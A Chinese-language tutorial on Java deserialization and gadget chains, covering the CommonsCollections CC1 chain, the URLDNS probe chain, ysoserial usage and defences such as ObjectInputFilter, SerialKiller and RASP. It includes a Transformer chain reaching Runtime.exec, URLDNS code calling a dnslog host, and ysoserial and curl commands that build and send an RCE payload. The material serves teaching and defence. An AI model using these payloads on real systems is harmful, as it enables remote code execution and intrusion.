---
title: 反序列化与 gadget 链：CommonsCollections 是怎么把对象变成 shell 的
description: 讲清 Java 原生反序列化的执行时机，拆解 gadget 链的概念，用 CommonsCollections、URLDNS 两条经典链说明"多个无害类串起来如何直达命令执行"，并给出 ObjectInputFilter 等 defense 手段与 ysoserial 用法。
category: security
subcategory: java-eco
tags: ['Java反序列化', 'gadget链', 'CommonsCollections', 'ysoserial', 'RCE']
pubDate: 2026-07-19
updatedDate: 2026-07-19
order: 3
---

前面讲了 Log4j 靠"日志解析"触发远程加载。Java 还有一条更"原生"的攻击路径：**反序列化**。只要应用把一段来自网络或文件的字节流 `readObject` 还原成对象，攻击者就可能在这"读回来"的一瞬间让代码跑起来。

这一篇从原理到经典链（CommonsCollections、URLDNS）拆给你看，重点是理解一个新词——**gadget 链**。

> 本文仅用于授权靶场与安全防御研究。对他人系统构造恶意序列化数据属违法。

## 反序列化：对象是怎么"活回来"的

Java 把对象存盘/传网络，靠 `ObjectOutputStream` 序列化；还原靠 `ObjectInputStream.readObject()`：

```java
// 序列化
ByteArrayOutputStream bos = new ByteArrayOutputStream();
new ObjectOutputStream(bos).writeObject(someObject);
byte[] data = bos.toByteArray();

// 反序列化（危险点就在这）
Object obj = new ObjectInputStream(new ByteArrayInputStream(data)).readObject();
```

危险在于：反序列化不是简单"填空"，它会**调用对象自己的生命周期方法**。如果一个类重写了 `readObject()`，或者它的属性在还原时被 setter/某些回调触发，那么这些方法里的代码会在你"读回来"时自动执行——你甚至没调用过这个对象的功能。

## gadget 链：把"小零件"拼成"大杀器"

单独一个类的方法往往干不了什么坏事。但 Java 生态里有大量"工具类"：它们的方法会**调用你传入对象的任意方法**、**执行你给的反射调用**。攻击者把这些"零件"（gadget）像多米诺骨牌一样串起来：

```text
反序列化入口类.readObject()
   → 调用 属性A.transform(...)
      → 属性A 是 ChainedTransformer
         → 依次调用 Transformer 链
            → InvokerTransformer：反射调用 Runtime.getRuntime().exec(...)
               → 命令执行
```

这条"从 readObject 一路走到 exec"的调用路径，就叫 **gadget 链**。Apache CommonsCollections 因为提供了 `Transformer`、`InvokerTransformer`、`ChainedTransformer`、`LazyMap` 这些"万能零件"，成了最著名的链来源，史称 **CC 链**。

## 经典链一：CommonsCollections CC1（思路版）

CC1 的核心拼法是：`AnnotationInvocationHandler`（它 `readObject` 时会访问 `LazyMap` 的键值）→ `LazyMap` 在取不到 key 时调用 `transformer.transform(...)` → `ChainedTransformer` 串起 `ConstantTransformer`(拿到 Runtime 类) + `InvokerTransformer`(反射调 `getMethod`/`invoke`) → 最终 `Runtime.exec`。

```java
// 示意（靶场练习用，勿用于未授权系统）
Transformer[] chain = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                           new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                           new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String.class},
                           new Object[]{"calc"})
};
Transformer transformed = new ChainedTransformer(chain);
Map lazy = LazyMap.decorate(new HashMap(), transformed);
// 再包一层 AnnotationInvocationHandler 触发 readObject 访问 lazy 的 key
```

不同 JDK/CommonsCollections 版本下，链的写法有 CC1~CC11 等变种（绕过 `InvokerTransformer` 被封、利用 `TemplatesImpl` 加载字节码等）。重点是理解"**拼零件**"的套路，而不是背某一条固定链。

## 经典链二：URLDNS（探测链）

URLDNS 不执行命令，只发一次 DNS 请求，但它是排查神器：用它打目标，如果**你的 DNS 平台收到解析请求**，就证明目标存在"反序列化点"且能触发回调——不用 RCE 也能确认漏洞存在。

```java
// 思路：HashMap 反序列化时会对 key 调 hashCode
// 把 key 设为 java.net.URL，其 hashCode 触发 URL 的 DNS 解析
HashMap map = new HashMap();
map.put(new URL("http://your-dns-id.dnslog.cn"), 1);
// 序列化 map 并发给目标，目标 readObject 即触发 DNS 查询
```

## 武器化工具：ysoserial

手工拼链太累，社区有了 `ysoserial`——一个集成了几十条已知 gadget 链（CommonsCollections、Groovy、Spring、JSON 等）的 payload 生成器：

```bash
# 生成一条 CommonsCollections5 的 RCE payload，命令是弹计算器
java -jar ysoserial.jar CommonsCollections5 "calc" > payload.bin

# 把 payload 作为某接口的"反序列化输入"发送（靶场场景）
curl -X POST --data-binary @payload.bin http://target/vuln/endpoint
```

`ysoserial` 的价值在于：它把"研究链"变成"验证链"，让你在授权范围内快速确认风险。但同样，它也是红队利器，务必只在授权环境使用。

## 防御：别让不可信数据进 readObject

- **JEP 290 ObjectInputFilter**：JDK 9+ 内置，可设置反序列化白名单，只允许特定类被还原：

```java
// 只允许常见安全类型，其余拒绝
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.safe.*;!*");  // !* 表示拒绝其他一切
ObjectInputStream ois = new ObjectInputStream(in);
ois.setObjectInputFilter(filter);
```

- **不反序列化不可信数据**：来自用户/网络的字节流，优先用 JSON，且关闭类型推断（见下一篇）。
- **升级组件**：CommonsCollections 3.2.2+ 默认关闭危险 transformer；移除不再需要的 CC 依赖。
- **加 RASP/HIDS**：在 `Runtime.exec`、`反射调用` 等敏感点做运行时拦截。

## 怎么在代码里找到反序列化点（审计视角）

如果你是做代码审计或自查，重点搜这几类"危险入口"：

- **直接 `readObject`**：`new ObjectInputStream(...).readObject()`，尤其当输入流来自网络（`ServletRequest.getInputStream`）、文件上传、消息队列、缓存（Redis 反序列化）。
- **`XMLDecoder` / `XStream.fromXML`**：XML 也能携带类信息，同样能触发 gadget。
- **`SnakeYAML` / `Yaml.load`**：YAML 的 `!!` 标签可指定类，配合危险构造也能利用。
- **第三方"自动反序列化"**：RMI、JMX、Redis 客户端、Hessian、Kryo 等，凡是"把字节流变对象"的地方都要怀疑。

审计时顺着"数据从哪来"反推：用户输入 → 网络接口 → 反序列化调用，只要中间没有类型白名单，就是潜在入口。

## JDK 版本与链的关系

不同 JDK 版本下，可用 gadget 差异很大，这是实战里最容易踩的坑：

- **JDK 8u71 之前**：`AnnotationInvocationHandler` 的 `readObject` 行为可被 CC1 利用；之后该类的 `readObject` 实现被改，CC1 失效，于是有了 CC6（改用 `HashMap` + `TiedMapEntry` 触发）。
- **`InvokerTransformer` 被封**：高版本 CommonsCollections 默认禁止 `InvokerTransformer` 反射执行，攻击者转向 `TemplatesImpl`（加载字节码）、`BeanComparator`、`PriorityQueue` 等替代链。
- **`ObjectInputFilter`（JEP 290）**：JDK 9+ 内置，可在 JVM 层统一限制可反序列化类，是兜底防线。

所以"同一条链打不通"往往不是你操作错了，而是**目标 JDK/组件版本不支持那条链**——理解版本差异，才能选对武器。

## 防御进阶：SerialKiller 与 RASP

除了 JDK 自带的 `ObjectInputFilter`，还有两个常用补充：

- **SerialKiller**：一个开源的 `ObjectInputStream` 替代实现，提供**类级白名单/黑名单**和深度限制，配置在 `serialkiller.conf` 里。它比手写 `ObjectInputFilter` 更方便，适合老 JDK（不支持 JEP 290）的项目：

```java
// 用 SerialKiller 替换原生流，自动按白名单校验
ObjectInputStream ois = new SerialKiller(in, "/path/serialkiller.conf");
Object obj = ois.readObject();
```

- **RASP（运行时应用自保护）**：在 JVM 层面 hook 敏感 API（`Runtime.exec`、`ProcessBuilder.start`、`反射调用`、`JNDI lookup`），一旦检测到"反序列化过程中触发命令执行"这类异常调用栈，直接阻断并记录。RASP 不依赖你改业务代码，是兜底利器，但会引入一定性能开销和兼容性测试成本。

两者定位不同：`ObjectInputFilter`/SerialKiller 是"入口白名单"，RASP 是"行为拦截"，生产环境常组合使用。

## 最小靶场：自己跑通一条链（授权环境）

想真正理解 gadget 链，光看不够，建议在本地靶场亲手跑一次：

1. 起一个漏洞环境（如 `vulhub` 里的 `java_deserialization` 或自写个接收 `readObject` 的接口）。
2. 用 `ysoserial` 生成 `CommonsCollections5` 的 payload 打到接口，观察是否弹出计算器/建立连接。
3. 换成 `URLDNS` 链，看 DNS 平台是否收到回调——体会"只探测不执行"的价值。
4. 加上 `ObjectInputFilter` 白名单后再打，确认被拦截，理解防御生效点。

亲手跑通一次，比读十篇原理都扎实。注意全程只在自己机器或授权靶场进行。

## gadget 链的通用性：为什么换了组件也要防

一个容易误解的点是：以为"把 CommonsCollections 升级掉就安全了"。其实 gadget 链**不专属** CommonsCollections——Spring、Hibernate、Groovy、Jackson、JSON 库各自都带过自己的 gadget。比如：

- `Spring` 的 `AbstractBeanFactory` / `TemplatesImpl` 组合；
- `Groovy` 的 `MethodClosure`；
- `Hibernate` 的某些 `toString` 触发链；
- 甚至 JDK 自带的 `HashMap` + `URL`（URLDNS）都不依赖任何第三方库。

所以真正要学的不是"记住某条 CC 链"，而是**理解这种模式**：只要一个生态里存在"魔法方法自动调用 + 反射/危险 sink（Runtime.exec、TemplatesImpl、JNDI）"的组合，就可能被串成链。防御也要治本：**不反序列化不可信数据 + 白名单限制可还原的类**，而不是指望某个组件永远不出新链。

## 一个常见疑问：JSON 库算不算反序列化

常有人问："JSON 不是文本吗，怎么也和反序列化扯上关系？"关键在于**反序列化的本质不是格式，而是'把外部数据变成对象并可能触发对象内部逻辑'**。原生 Java 序列化如此，Fastjson/Jackson 开了类型推断后也如此——它们把 JSON 里的类名当成"要实例化的对象类型"，于是同样会触发构造方法、`setter` 里的逻辑，甚至 gadget 链。所以"用 JSON 就安全"的错觉，只在没有类型推断时才成立；一旦允许 `@type`/`@class`，它就和原生 `readObject` 是同一类风险。这也解释了为什么本篇和上一篇（JSON 库漏洞）要连着看——它们是同一个坑的两种入口。

## 常见误区

- **"用了 JSON 就绝对安全"**：看 JSON 库是否支持类型推断（下一篇），支持的话照样能反序列化利用。
- **"我们没引 CommonsCollections 就没事"**：`Spring`、`Groovy`、`Hibernate`、`JSON` 库各自都带过 gadget 链，ysoserial 里几十种链对应不同组件。
- **"反序列化只发生在明显的地方"**：RMI、JMX、Redis、消息队列里的隐式反序列化更危险，因为开发者往往没意识到那里也在 `readObject`。

## 自测题

1. 在你熟悉的一个 Java 项目里，找出所有 `readObject` / `fromXML` / `Yaml.load` 的调用点，判断输入是否来自外部。
2. 为什么 CC1 在高版本 JDK 上打不通，而 CC6 可以？
3. `ObjectInputFilter` 怎么用一句话描述它的作用？
4. URLDNS 链不打命令，为什么在实战里反而很有用？

## 这一篇你该记住的

- Java 反序列化会在 `readObject()` 时**自动调用对象生命周期方法**，这是危险根源。
- **gadget 链** = 多个"无害工具类"的调用被串起来，从反序列化入口一路走到 `Runtime.exec`。
- CommonsCollections 因提供 `Transformer` 系列"万能零件"成为最著名链源（CC1~CC11）。
- URLDNS 链不执行命令、只发 DNS，是**探测反序列化点是否存在**的安全手段。
- `ysoserial` 把已知链武器化，用于授权验证；防御靠 `ObjectInputFilter` 白名单、不反序列化不可信数据、升级组件。

下一篇我们聊"数据层"的另一个重灾区——**JSON 解析库**。你会看到 Fastjson 的 `autoType`、Jackson 的多态类型，本质上和反序列化链是同一类思路：让库"按攻击者指定的类"去实例化。